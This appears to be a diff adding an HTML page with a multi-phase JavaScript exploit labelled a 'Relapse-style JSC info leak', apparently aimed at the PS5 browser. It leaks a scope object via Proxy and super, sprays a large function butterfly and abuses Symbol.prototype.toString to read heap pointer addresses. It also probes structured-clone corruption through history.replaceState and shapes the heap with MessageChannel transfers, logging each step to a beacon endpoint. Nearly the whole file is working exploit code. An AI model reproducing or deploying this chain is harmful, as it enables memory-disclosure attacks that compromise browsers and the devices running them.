@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V584</title></head>
+<body><pre id="out">V584 — Relapse-style JSC info leak chain</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V584-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+function hex(v){return'0x'+('0000000000000000'+v.toString(16)).slice(-16);}
+function hex32(v){return'0x'+('00000000'+v.toString(16)).slice(-8);}
+
+bk('BOOT','v584-relapse-info-leak');
+say('V584: Relapse-style JSC info leak\n');
+
+var PHASE='INIT';
+function phase(p,d){PHASE=p;bk(p,d||'');say(p+': '+(d||'ok'));}
+
+try{
+
+/* ===== PHASE 1: Verify prerequisites ===== */
+phase('P1-CHECK','verifying-apis');
+var checks=[];
+checks.push('BigInt='+(typeof BigInt==='function'));
+checks.push('MC='+(typeof MessageChannel!=='undefined'));
+checks.push('Symbol='+(typeof Symbol==='function'));
+checks.push('history='+(typeof history.replaceState==='function'));
+checks.push('Proxy='+(typeof Proxy==='function'));
+
+var allOk=typeof BigInt==='function'&&typeof MessageChannel!=='undefined'&&
+  typeof Symbol==='function'&&typeof history.replaceState==='function'&&
+  typeof Proxy==='function';
+bk('P1-RESULT',checks.join(','));
+say('Prerequisites: '+checks.join(', '));
+if(!allOk){bk('ABORT','missing-api');say('ABORT: missing API');throw new Error('missing');}
+
+/* ===== PHASE 2: Scope leak via class/super/Proxy ===== */
+phase('P2-SCOPE','leaking-scope-object');
+
+var leakedScope=null;
+try{
+  leakedScope=eval("(function(){class L{leak(){return super.foo;}}L.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r;}});var lk=L.prototype.leak;return(function(){return lk();})();})()");
+}catch(e1){
+  bk('P2-CLASS-ERR',e1.name+':'+e1.message.slice(0,60));
+  /* Fallback: manual prototype chain */
+  try{
+    var LeakerProto=new Proxy({},{get:function(t,p,r){return r;}});
+    function Leaker(){}
+    Leaker.prototype.__proto__=LeakerProto;
+    Leaker.prototype.leak=function(){return super.foo;};
+    var lkFn=Leaker.prototype.leak;
+    leakedScope=(function(){return lkFn();})();
+  }catch(e2){
+    bk('P2-FALLBACK-ERR',e2.name+':'+e2.message.slice(0,60));
+    /* Last resort: plain Proxy receiver */
+    try{
+      var h={get:function(t,p,r){return r;}};
+      var px=new Proxy({},h);
+      function F(){}
+      F.prototype=px;
+      leakedScope=new F().anything;
+    }catch(e3){bk('P2-LAST-ERR',e3.name);}
+  }
+}
+
+var scopeOk=leakedScope!==null&&leakedScope!==undefined;
+bk('P2-RESULT','scope='+(scopeOk?'YES':'NO')+',type='+(typeof leakedScope));
+say('Scope leak: '+(scopeOk?'SUCCESS ('+typeof leakedScope+')':'FAILED'));
+if(!scopeOk){bk('ABORT','no-scope');throw new Error('scope-failed');}
+
+/* ===== PHASE 3: Build butterfly with target objects ===== */
+phase('P3-BUTTERFLY','building-butterfly');
+
+var MEMORY_WINDOW_SIZE=0x100;
+var memoryBuffer=new ArrayBuffer(MEMORY_WINDOW_SIZE);
+var memoryView=new Uint8Array(memoryBuffer);
+memoryView[0]=0x3c;
+
+var fakeHost={
+  q0:1.1,
+  q2:memoryView,
+  q3:{keep:0x51515151}
+};
+
+var targetHolder={
+  q0:parseInt,
+  q1:document.createElement('div'),
+  q2:{marker:0x4d41524b},
+  q3:{marker:0x4d41524c}
+};
+
+var getterFn=function getterCarrier(){return 7;};
+getterFn[0]=fakeHost;
+getterFn[1]=targetHolder;
+getterFn[2]=fakeHost;
+getterFn[3]=targetHolder;
+
+/* Fill butterfly — 1M entries first (conservative for PS5 memory) */
+var BUTTERFLY_SIZE=1000000;
+var fillStart=Date.now();
+for(var k=4;k<BUTTERFLY_SIZE;k++)getterFn[k]=0;
+var fillTime=Date.now()-fillStart;
+bk('P3-FILL','size='+BUTTERFLY_SIZE+',time='+fillTime+'ms');
+say('Butterfly: '+BUTTERFLY_SIZE+' entries, '+fillTime+'ms');
+
+/* Add named properties to scope */
+for(var i=0;i<512;i++)leakedScope['p'+i]=i;
+for(var j=0;j<8;j++)leakedScope[j]=1.1*j;
+
+/* ===== PHASE 4: Symbol.toString leak ===== */
+phase('P4-SYMLEAK','symbol-tostring-leak');
+
+var symbolToString=Symbol.prototype.toString;
+var capturedString=null;
+var capturedLen=0;
+var ptrsValid=false;
+var addr1=NaN,addr2=NaN;
+
+try{
+  Object.defineProperty(leakedScope,'g',{
+    get:getterFn,
+    configurable:true
+  });
+  var preparedSymbol=Object(leakedScope.g);
+  bk('P4-WRAP','type='+(typeof preparedSymbol));
+
+  capturedString=symbolToString.call(preparedSymbol);
+  capturedLen=capturedString.length;
+  bk('P4-STRLEN','len='+capturedLen);
+  say('Symbol string length: '+capturedLen);
+
+  /* Read charCodes — scan for non-zero pointer-like values */
+  var firstNonZero=-1;
+  var nonZeroCount=0;
+  var sampleCodes='';
+  for(var ci=0;ci<Math.min(64,capturedLen);ci++){
+    var cc=capturedString.charCodeAt(ci);
+    if(ci<32)sampleCodes+=hex32(cc)+' ';
+    if(cc!==0&&firstNonZero===-1)firstNonZero=ci;
+    if(cc!==0)nonZeroCount++;
+  }
+  bk('P4-CODES','first32='+sampleCodes.slice(0,300));
+  bk('P4-SCAN','firstNZ='+firstNonZero+',nzCount='+nonZeroCount);
+  say('First non-zero at: '+firstNonZero+', count: '+nonZeroCount);
+
+  /* Try reading at Relapse offset 7 (skip "Symbol(" prefix) */
+  if(capturedLen>23){
+    var capturedWords=new Uint16Array(16);
+    for(var pi=0;pi<16;pi++){
+      capturedWords[pi]=capturedString.charCodeAt(7+pi);
+    }
+    function ptr48(w,off){
+      if(w[off+3]!==0)return NaN;
+      return w[off]+w[off+1]*0x10000+w[off+2]*0x100000000;
+    }
+    addr1=ptr48(capturedWords,0);
+    addr2=ptr48(capturedWords,4);
+    var addr3=ptr48(capturedWords,8);
+    var addr4=ptr48(capturedWords,12);
+
+    bk('P4-ADDRS','a1='+hex(addr1||0)+',a2='+hex(addr2||0)+',a3='+hex(addr3||0)+',a4='+hex(addr4||0));
+    say('A1='+hex(addr1||0)+' A2='+hex(addr2||0));
+
+    ptrsValid=!isNaN(addr1)&&!isNaN(addr2)&&addr1!==addr2&&
+      addr1===addr3&&addr2===addr4&&
+      addr1>0x100000000&&addr1<0x1000000000000&&
+      addr2>0x100000000&&addr2<0x1000000000000;
+
+    bk('P4-VALID','valid='+ptrsValid);
+    if(ptrsValid){
+      bk('P4-LEAKED','fakeHost='+hex(addr1)+',holder='+hex(addr2));
+      say('\n*** INFO LEAK SUCCESS ***');
+      say('fakeHost='+hex(addr1)+' holder='+hex(addr2));
+    }
+  }
+
+  /* Also scan for pointer patterns anywhere in the string */
+  if(!ptrsValid&&capturedLen>100){
+    var found=[];
+    for(var si=0;si<Math.min(capturedLen-3,2000);si++){
+      var w0=capturedString.charCodeAt(si);
+      var w1=capturedString.charCodeAt(si+1);
+      var w2=capturedString.charCodeAt(si+2);
+      var w3=capturedString.charCodeAt(si+3);
+      if(w3===0&&w2>0&&w2<0x8000){
+        var candidate=w0+w1*0x10000+w2*0x100000000;
+        if(candidate>0x100000000&&candidate<0x1000000000000&&candidate%8===0){
+          found.push('off='+si+':'+hex(candidate));
+          if(found.length>=8)break;
+        }
+      }
+    }
+    if(found.length>0){
+      bk('P4-FOUND',found.join(',').slice(0,350));
+      say('Found ptrs: '+found.join(', '));
+    }else{
+      bk('P4-NOPTR','scanned='+Math.min(capturedLen,2000));
+    }
+  }
+}catch(e){
+  bk('P4-ERR',e.name+':'+e.message.slice(0,100));
+  say('Symbol toString failed: '+e.message);
+}
+
+/* ===== PHASE 5: History structured clone ===== */
+phase('P5-HISTORY','testing-clone-corruption');
+
+try{
+  var shared={x:42};
+  var testGraph=[shared,shared];
+  history.replaceState(testGraph,'');
+  var cloned=history.state;
+  var isAlias=cloned&&cloned[0]===cloned[1];
+  bk('P5-ALIAS','alias='+isAlias);
+
+  /* Large array with duplicate ref + BigInt filler (Relapse pattern) */
+  var CONTROL_INDEX=0xffff;
+  var outerGraph=new Array(CONTROL_INDEX+1);
+  var huge=BigInt(1)<<BigInt(40);
+  outerGraph[0]=[huge];
+  var ref={marker:0x51};
+  outerGraph[1]=ref;
+  outerGraph[2]=ref;
+  outerGraph[CONTROL_INDEX]=-64000;
+  history.replaceState(outerGraph,'');
+  var lc=history.state;
+  bk('P5-LARGE','len='+(lc?lc.length:0)+',dup='+(lc?lc[1]===lc[2]:false)+',ctrl='+(lc?lc[CONTROL_INDEX]:0));
+  say('Large clone: dup='+(lc?lc[1]===lc[2]:'?'));
+  history.replaceState(null,'');
+}catch(e){
+  bk('P5-ERR',e.name+':'+e.message.slice(0,80));
+}
+
+/* ===== PHASE 6: MessageChannel transfer ===== */
+phase('P6-MC','transfer-test');
+
+try{
+  var mc=new MessageChannel();
+  var xb=new ArrayBuffer(0x10000);
+  new Uint8Array(xb)[0]=0xAA;
+  mc.port1.postMessage(0,[xb]);
+  bk('P6-XFER','detached='+(xb.byteLength===0));
+  say('MC transfer: detached='+(xb.byteLength===0));
+
+  /* Hole creation */
+  var mc2=new MessageChannel();
+  var h1=new ArrayBuffer(0x80000);
+  var h2=new ArrayBuffer(0x80000);
+  mc2.port1.postMessage(0,[h1,h2]);
+  bk('P6-HOLES','h1='+(h1.byteLength===0)+',h2='+(h2.byteLength===0));
+  mc.port1.close();mc.port2.close();
+  mc2.port1.close();mc2.port2.close();
+}catch(e){
+  bk('P6-ERR',e.name+':'+e.message.slice(0,80));
+}
+
+/* ===== DONE ===== */
+setTimeout(function(){
+  var s='scope='+(scopeOk?'Y':'N')+',len='+capturedLen+',leak='+(ptrsValid?hex(addr1):'NO');
+  bk('DONE',s);
+  say('\nV584 complete. '+s);
+},3000);
+
+}catch(e){
+  bk('FATAL',PHASE+':'+e.name+':'+e.message.slice(0,100));
+  say('FATAL in '+PHASE+': '+e.message);
+}
+</script>
+</body></html>
